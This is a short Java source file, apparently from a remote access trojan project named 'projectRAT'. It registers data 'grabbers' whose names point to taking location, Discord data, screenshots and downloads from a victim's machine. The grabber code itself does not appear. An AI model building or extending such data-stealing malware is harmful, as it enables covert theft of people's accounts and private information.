package in.momin5.projectRAT.request;

import in.momin5.projectRAT.request.grabbers.*;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class RequestManager {

    private List<Request> requests = new ArrayList<>();

    public RequestManager() {
        requests.addAll(Arrays.asList(
                new MiscGrabs(),
                new Location(),
                new Discord(),
                new Test(),
                new ScreenShot(),
                new Downloads()
        ));
    }

    public List<Request> getRequests() {
        return requests;
    }
}
